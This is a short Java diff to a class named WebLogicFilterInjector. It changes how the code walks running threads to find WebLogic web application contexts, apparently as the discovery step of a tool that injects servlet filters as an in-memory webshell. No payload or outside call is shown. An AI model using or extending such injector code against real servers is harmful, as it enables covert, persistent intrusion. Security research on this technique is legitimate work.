@@ -87,12 +87,8 @@ public class WebLogicFilterInjector {
 
     public static Object[] getContextsByThreads() throws Throwable {
         Set<Object> webappContexts = new HashSet<Object>();
-        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
-        int threadCount = threadGroup.activeCount();
-        Thread[] threads = new Thread[threadCount];
-        threadGroup.enumerate(threads);
-        for (int i = 0; i < threadCount; i++) {
-            Thread thread = threads[i];
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
             if (thread != null) {
                 Object workEntry = getFieldValue(thread, "workEntry");
                 if (workEntry != null) {
